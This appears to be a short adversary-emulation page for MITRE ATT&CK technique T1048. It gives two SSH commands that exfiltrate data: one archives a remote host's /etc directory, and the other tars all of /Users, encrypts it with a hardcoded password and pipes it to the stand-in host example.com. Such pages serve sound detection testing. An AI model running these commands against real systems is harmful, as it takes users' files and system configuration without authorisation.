# Exfiltration Over Alternative Protocol

## MITRE ATT&CK Technique:
[T1048](https://attack.mitre.org/wiki/Technique/T1048)

## SSH

### Remote to Local:

    ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz

### Local to Remote:

    tar czpf - /Users/* | openssl des3 -salt -pass pass:1234 | ssh foo@example.com 'cat > /Users.tar.gz.enc'
